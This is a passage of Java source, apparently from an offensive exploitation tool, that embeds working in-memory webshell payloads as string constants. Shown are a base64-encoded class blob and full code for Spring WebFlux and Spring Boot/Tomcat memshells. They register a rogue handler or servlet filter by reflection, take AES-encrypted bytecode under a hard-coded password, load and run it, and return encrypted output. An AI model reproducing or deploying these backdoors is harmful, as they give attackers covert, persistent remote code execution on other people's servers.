lY3JldEtleVNwZWMMAQUBBgwAYQEHDAEIAQkMAQoBCwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAANNRDUHAQwMAQMBDQwBDgEPDAEQAREBABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBEgEGDABhARMMAP8BFAwBFQEAAQAQamF2YS51dGlsLkJhc2U2NAwBFgEXAQAKZ2V0RW5jb2RlcgEAEltMamF2YS9sYW5nL0NsYXNzOwwBGAEZAQATW0xqYXZhL2xhbmcvT2JqZWN0OwcBGgwBGwEcDAEdAR4BAA5lbmNvZGVUb1N0cmluZwEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQAWc3VuLm1pc2MuQkFTRTY0RW5jb2RlcgwBHwEgAQAGZW5jb2RlAQAKZ2V0RGVjb2RlcgEABmRlY29kZQEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIBAAxkZWNvZGVCdWZmZXIHASEMASIBIwEAQG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXMMASQBJQwBJgEnAQAQWC1SZXF1ZXN0ZWQtV2l0aAcA+gwBKAB8AQAOWE1MSFRUUFJlcXVlc3QMASkBKgwBKwEsDAEtAHwMAIoAiwwAbwBwAQAQbWVtc2hlbGwucGF5bG9hZAcA/AwBLgEvAQAebWVtc2hlbGwvU3ByaW5nQ29udHJvbGxlclNoZWxsDAEwATEMAGsAbAwBMgEzAQAKcGFyYW1ldGVycwEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtDAE0ATUHAPsMATYBNwwBOAE5BwE6DAE7ATwMAT0BBgwAgACBDAE4ARQMAT4AYgwBPwBiAQAOWG1sSFRUUFJlcXVlc3QBAAdTdWNjZXNzAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAtkZWZpbmVDbGFzcwEAFyhbQklJKUxqYXZhL2xhbmcvQ2xhc3M7AQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAEaW5pdAEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQA8b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RDb250ZXh0SG9sZGVyAQAYY3VycmVudFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEACmdldFJlcXVlc3QBACkoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEAC2dldFJlc3BvbnNlAQAqKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0UGFyYW1ldGVyAQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAxzZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEACXN1YnN0cmluZwEAFihJSSlMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAt0b0J5dGVBcnJheQEABWZsdXNoAQAFY2xvc2UAIQBFAFoAAAAFAAAAWwBcAAAAAQBdAFwAAAABAF4AXAAAAAAAXwBcAAAAAQBgAFwAAAAIAAEAYQBiAAEAYwAAAH4AAwABAAAAPCq3AAEqEgK1AAMqEgS1AAUqEga1AAcquwAIWbcACSq0AAW2AAoqtAADtgAKtgALuAAMtQANKhIOtQAPsQAAAAIAZAAAAB4ABwAAABcABAARAAoAEgAQABMAFgAYADUAGQA7ABoAZQAAAAwAAQAAADwAZgBnAAAAAQBhAGgAAQBjAAAAiQADAAIAAAA9Kiu3ABAqEgK1AAMqEgS1AAUqEga1AAcquwAIWbcACSq0AAW2AAoqtAADtgAKtgALuAAMtQANKhIOtQAPsQAAAAIAZAAAAB4ABwAAABwABQARAAsAEgARABMAFwAdADYAHgA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\");\n" +
            "                Class var3 = (Class) var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);\n" +
            "                MEMSHELL_OBJECT = var3.newInstance();\n" +
            "            } catch (Exception var4) {\n" +
            "            }\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    static{\n" +
            "        new SpringControllerMemShell();\n" +
            "    }\n" +
            "}\n";

    public static final String SpringWebfluxHandlerMemShell=
            "import com.sun.org.apache.xalan.internal.xsltc.DOM;\n" +
            "import com.sun.org.apache.xalan.internal.xsltc.TransletException;\n" +
            "import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\n" +
            "import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\n" +
            "import com.sun.org.apache.xml.internal.serializer.SerializationHandler;\n" +
            "import org.springframework.http.HttpStatus;\n" +
            "import org.springframework.http.ResponseEntity;\n" +
            "import org.springframework.web.bind.annotation.PostMapping;\n" +
            "import org.springframework.web.reactive.result.method.RequestMappingInfo;\n" +
            "import org.springframework.web.server.ServerWebExchange;\n" +
            "import reactor.core.publisher.Mono;\n" +
            "\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.net.URL;\n" +
            "import java.net.URLClassLoader;\n" +
            "import java.util.HashMap;\n" +
            "import java.util.Map;\n" +
            "\n" +
            "\n" +
            "public class SpringWebfluxHandlerMemShell extends AbstractTranslet {\n" +
            "    public static Map<String, Object> store = new HashMap<String , Object>();\n" +
            "    public static String pass = \"pAS3\", md5, xc = \"3c6e0b8a9c15224a\";\n" +
            "\n" +
            "    public static String doInject(Object obj, String path) {\n" +
            "        String msg;\n" +
            "        try {\n" +
            "            md5 = md5(pass + xc);\n" +
            "            Method registerHandlerMethod = obj.getClass().getDeclaredMethod(\"registerHandlerMethod\", Object.class, Method.class, RequestMappingInfo.class);\n" +
            "            registerHandlerMethod.setAccessible(true);\n" +
            "            Method executeCommand = SpringWebfluxHandlerMemShell.class.getDeclaredMethod(\"xx\", ServerWebExchange.class);\n" +
            "            RequestMappingInfo requestMappingInfo = RequestMappingInfo.paths(path).build();\n" +
            "            registerHandlerMethod.invoke(obj, new SpringWebfluxHandlerMemShell(), executeCommand, requestMappingInfo);\n" +
            "            msg = \"ok\";\n" +
            "        } catch (Exception e) {\n" +
            "            e.printStackTrace();\n" +
            "            msg = \"error\";\n" +
            "        }\n" +
            "        return msg;\n" +
            "    }\n" +
            "\n" +
            "\n" +
            "    private static Class defineClass(byte[] classbytes) throws Exception {\n" +
            "        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());\n" +
            "        Method method = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
            "        method.setAccessible(true);\n" +
            "        return (Class) method.invoke(urlClassLoader, classbytes, 0, classbytes.length);\n" +
            "    }\n" +
            "\n" +
            "    public byte[] x(byte[] s, boolean m) {\n" +
            "        try {\n" +
            "            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");\n" +
            "            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), \"AES\"));\n" +
            "            return c.doFinal(s);\n" +
            "        } catch (Exception e) {\n" +
            "            return null;\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static String md5(String s) {\n" +
            "        String ret = null;\n" +
            "        try {\n" +
            "            java.security.MessageDigest m;\n" +
            "            m = java.security.MessageDigest.getInstance(\"MD5\");\n" +
            "            m.update(s.getBytes(), 0, s.length());\n" +
            "            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "        return ret;\n" +
            "    }\n" +
            "\n" +
            "    public static String base64Encode(byte[] bs) throws Exception {\n" +
            "        String value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object Encoder = base64.getMethod(\"getEncoder\", (Class[])null).invoke(base64, (Object[])null);\n" +
            "            value = (String)Encoder.getClass().getMethod(\"encodeToString\", byte[].class).invoke(Encoder, bs);\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Encoder\");\n" +
            "                Object Encoder = base64.newInstance();\n" +
            "                value = (String)Encoder.getClass().getMethod(\"encode\", byte[].class).invoke(Encoder, bs);\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[])null).invoke(base64, (Object[])null);\n" +
            "            value = (byte[])((byte[])decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[])((byte[])decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    @PostMapping(\"/xx\")\n" +
            "    public synchronized ResponseEntity xx(\n" +
            "            ServerWebExchange pdata) {\n" +
            "        try {\n" +
            "            Object bufferStream = pdata.getFormData().flatMap(c -> {\n" +
            "                StringBuilder result = new StringBuilder();\n" +
            "                try {\n" +
            "                    String id = c.getFirst(pass);\n" +
            "                    byte[] data = x(base64Decode(id), false);\n" +
            "                    if (store.get(\"payload\") == null) {\n" +
            "                        store.put(\"payload\", defineClass(data));\n" +
            "                    } else {\n" +
            "                        store.put(\"parameters\", data);\n" +
            "                        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();\n" +
            "                        Object f = ((Class) store.get(\"payload\")).newInstance();\n" +
            "                        f.equals(arrOut);\n" +
            "                        f.equals(data);\n" +
            "                        result.append(md5.substring(0, 16));\n" +
            "                        f.toString();\n" +
            "                        result.append(base64Encode(x(arrOut.toByteArray(), true)));\n" +
            "                        result.append(md5.substring(16));\n" +
            "                    }\n" +
            "                } catch (Exception ex) {\n" +
            "                    result.append(ex.getMessage());\n" +
            "                }\n" +
            "                return Mono.just(result.toString());\n" +
            "            });\n" +
            "            return new ResponseEntity(bufferStream, HttpStatus.OK);\n" +
            "        } catch (Exception ex) {\n" +
            "            return new ResponseEntity(ex.getMessage(), HttpStatus.OK);\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    @Override\n" +
            "    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    @Override\n" +
            "    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\n" +
            "\n" +
            "    }\n" +
            "}";

    public static final String SpringBootMemShell =
            "import org.apache.catalina.LifecycleState;\n" +
            "import org.apache.catalina.core.ApplicationContext;\n" +
            "import org.apache.catalina.core.StandardContext;\n" +
            "import org.apache.catalina.util.LifecycleBase;\n" +
            "\n" +
            "import javax.crypto.Cipher;\n" +
            "import javax.crypto.spec.SecretKeySpec;\n" +
            "import javax.servlet.*;\n" +
            "import javax.servlet.FilterRegistration.Dynamic;\n" +
            "import javax.servlet.http.HttpServletRequest;\n" +
            "import javax.servlet.http.HttpServletResponse;\n" +
            "import javax.servlet.http.HttpSession;\n" +
            "import java.io.ByteArrayOutputStream;\n" +
            "import java.io.IOException;\n" +
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.math.BigInteger;\n" +
            "import java.security.MessageDigest;\n" +
            "import java.util.EnumSet;\n" +
            "\n" +
            "public class SpringBootMemShell extends ClassLoader implements Filter {\n" +
            "    public HttpServletRequest request = null;\n" +
            "    public HttpServletResponse response = null;\n" +
            "    String xc = \"3c6e0b8a9c15224a\";\n" +
            "    public String Pwd = \"pAS3\";\n" +
            "    public String path = \"/*\";\n" +
            "    String md5;\n" +
            "    public String cs;\n" +
            "\n" +
            "    public SpringBootMemShell() {\n" +
            "        this.md5 = md5(this.Pwd + this.xc);\n" +
            "        this.cs = \"UTF-8\";\n" +
            "    }\n" +
            "\n" +
            "    public SpringBootMemShell(ClassLoader z) {\n" +
            "        super(z);\n" +
            "        this.md5 = md5(this.Pwd + this.xc);\n" +
            "        this.cs = \"UTF-8\";\n" +
            "    }\n" +
            "\n" +
            "    public Class Q(byte[] cb) {\n" +
            "        return super.defineClass(cb, 0, cb.length);\n" +
            "    }\n" +
            "\n" +
            "    public byte[] x(byte[] s, boolean m) {\n" +
            "        try {\n" +
            "            Cipher c = Cipher.getInstance(\"AES\");\n" +
            "            c.init(m ? 1 : 2, new SecretKeySpec(this.xc.getBytes(), \"AES\"));\n" +
            "            return c.doFinal(s);\n" +
            "        } catch (Exception var4) {\n" +
            "            return null;\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static String md5(String s) {\n" +
            "        String ret = null;\n" +
            "\n" +
            "        try {\n" +
            "            MessageDigest m = MessageDigest.getInstance(\"MD5\");\n" +
            "            m.update(s.getBytes(), 0, s.length());\n" +
            "            ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase();\n" +
            "        } catch (Exception var3) {\n" +
            "        }\n" +
            "\n" +
            "        return ret;\n" +
            "    }\n" +
            "\n" +
            "    public static String base64Encode(byte[] bs) throws Exception {\n" +
            "        String value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object Encoder = base64.getMethod(\"getEncoder\", (Class[])null).invoke(base64, (Object[])null);\n" +
            "            value = (String)Encoder.getClass().getMethod(\"encodeToString\", byte[].class).invoke(Encoder, bs);\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Encoder\");\n" +
            "                Object Encoder = base64.newInstance();\n" +
            "                value = (String)Encoder.getClass().getMethod(\"encode\", byte[].class).invoke(Encoder, bs);\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[])null).invoke(base64, (Object[])null);\n" +
            "            value = (byte[])((byte[])((byte[])decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs)));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[])((byte[])((byte[])decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs)));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    public boolean equals(Object obj) {\n" +
            "        this.parseObj(obj);\n" +
            "        try {\n" +
            "            this.addFilter();\n" +
            "        } catch (Exception e) {\n" +
            "\n" +
            "        }\n" +
            "        return true;\n" +
            "    }\n" +
            "\n" +
            "    public void parseObj(Object obj) {\n" +
            "        if (obj.getClass().isArray()) {\n" +
            "            Object[] data = (Object[])((Object[])((Object[])obj));\n" +
            "            this.request = (HttpServletRequest)data[0];\n" +
            "            this.response = (HttpServletResponse)data[1];\n" +
            "        } else {\n" +
            "            try {\n" +
            "                Class clazz = Class.forName(\"javax.servlet.jsp.PageContext\");\n" +
            "                this.request = (HttpServletRequest)clazz.getDeclaredMethod(\"getRequest\").invoke(obj);\n" +
            "                this.response = (HttpServletResponse)clazz.getDeclaredMethod(\"getResponse\").invoke(obj);\n" +
            "            } catch (Exception var8) {\n" +
            "                if (obj instanceof HttpServletRequest) {\n" +
            "                    this.request = (HttpServletRequest)obj;\n" +
            "\n" +
            "                    try {\n" +
            "                        Field req = this.request.getClass().getDeclaredField(\"request\");\n" +
            "                        req.setAccessible(true);\n" +
            "                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);\n" +
            "                        Field resp = request2.getClass().getDeclaredField(\"response\");\n" +
            "                        resp.setAccessible(true);\n" +
            "                        this.response = (HttpServletResponse)resp.get(request2);\n" +
            "                    } catch (Exception var7) {\n" +
            "                        try {\n" +
            "                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod(\"getResponse\").invoke(obj);\n" +
            "                        } catch (Exception var6) {\n" +
            "                        }\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public void addFilter() throws Exception {\n" +
            "        ServletContext servletContext = this.request.getServletContext();\n" +
            "        Filter filter = this;\n" +
            "        String filterName = this.path;\n" +
            "        String url = this.path;\n" +
            "        if (servletContext.getFilterRegistration(filterName) == null) {\n" +
            "            Field contextField = null;\n" +
            "            ApplicationContext applicationContext = null;\n" +
            "            StandardContext standardContext = null;\n" +
            "            Field stateField = null;\n" +
            "            Dynamic filterRegistration = null;\n" +
            "\n" +
            "            String var11;\n" +
            "            try {\n" +
            "                contextField = servletContext.getClass().getDeclaredField(\"context\");\n" +
            "                contextField.setAccessible(true);\n" +
            "                applicationContext = (ApplicationContext)contextField.get(servletContext);\n" +
            "                contextField = applicationContext.getClass().getDeclaredField(\"context\");\n" +
            "                contextField.setAccessible(true);\n" +
            "                standardContext = (StandardContext)contextField.get(applicationContext);\n" +
            "                stateField = LifecycleBase.class.getDeclaredField(\"state\");\n" +
            "                stateField.setAccessible(true);\n" +
            "                stateField.set(standardContext, LifecycleState.STARTING_PREP);\n" +
            "                filterRegistration = servletContext.addFilter(filterName, filter);\n" +
            "                filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, new String[]{url});\n" +
            "                Method filterStartMethod = StandardContext.class.getMethod(\"filterStart\");\n" +
            "                filterStartMethod.setAccessible(true);\n" +
            "                filterStartMethod.invoke(standardContext, (Object[])null);\n" +
            "                stateField.set(standardContext, LifecycleState.STARTED);\n" +
            "                var11 = null;\n" +
            "\n" +
            "                Class filterMap;\n" +
            "                try {\n" +
            "                    filterMap = Class.forName(\"org.apache.tomcat.util.descriptor.web.FilterMap\");\n" +
            "                } catch (Exception var22) {\n" +
            "                    filterMap = Class.forName(\"org.apache.catalina.deploy.FilterMap\");\n" +
            "                }\n" +
            "\n" +
            "                Method findFilterMaps = standardContext.getClass().getMethod(\"findFilterMaps\");\n" +
            "                Object[] filterMaps = (Object[])((Object[])((Object[])findFilterMaps.invoke(standardContext)));\n" +
            "\n" +
            "                for(int i = 0; i < filterMaps.length; ++i) {\n" +
            "                    Object filterMapObj = filterMaps[i];\n" +
            "                    findFilterMaps = filterMap.getMethod(\"getFilterName\");\n" +
            "                    String name = (String)findFilterMaps.invoke(filterMapObj);\n" +
            "                    if (name.equalsIgnoreCase(filterName)) {\n" +
            "                        filterMaps[i] = filterMaps[0];\n" +
            "                        filterMaps[0] = filterMapObj;\n" +
            "                    }\n" +
            "                }\n" +
            "            } catch (Exception var23) {\n" +
            "                var11 = var23.getMessage();\n" +
            "            } finally {\n" +
            "                stateField.set(standardContext, LifecycleState.STARTED);\n" +
            "            }\n" +
            "\n" +
            "        } else {\n" +
            "\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public void init(FilterConfig filterConfig) throws ServletException {\n" +
            "    }\n" +
            "\n" +
            "    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n" +
            "        try{\n" +
            "            request = (HttpServletRequest)servletRequest;\n" +
            "            response = (HttpServletResponse)servletResponse;\n" +
            "            if (request.getHeader(\"X-Requested-With\") != null && request.getHeader(\"X-Requested-With\").indexOf(\"XMLHTTPRequest\") != -1){\n" +
            "                HttpSession session = request.getSession();\n" +
            "//                this.noLog(request);\n" +
            "                byte[] data = base64Decode(request.getParameter(this.Pwd));\n" +
            "                data = this.x(data, false);\n" +
            "                if (session.getAttribute(\"memshell.payload\") == null) {\n" +
            "                    session.setAttribute(\"memshell.payload\", (new SpringBootMemShell(this.getClass().getClassLoader())).Q(data));\n" +
            "                } else {\n" +
            "                    request.setAttribute(\"parameters\", data);\n" +
            "                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();\n" +
            "                    Object f = ((Class)session.getAttribute(\"memshell.payload\")).newInstance();\n" +
            "                    f.equals(arrOut);\n" +
            "                    f.equals(data);\n" +
            "                    f.equals(request);\n" +
            "                    response.getWriter().write(this.md5.substring(0, 16));\n" +
            "                    f.toString();\n" +
            "                    response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));\n" +
            "                    response.getWriter().write(this.md5.substring(16));\n" +
            "                }\n" +
            "            }\n" +
            "            else if (request.getHeader(\"X-Requested-With\") != null && request.getHeader(\"X-Requested-With\").indexOf(\"XmlHTTPRequest\") != -1) {\n" +
            "                response.getWriter().write(\"Success\");\n" +
            "            }\n" +
            "            else{\n" +
            "                filterChain.doFilter(servletRequest,servletResponse);\n" +
            "            }\n" +
            "        } catch (Exception var9) {\n" +
            "            var9.printStackTrace();\n" +
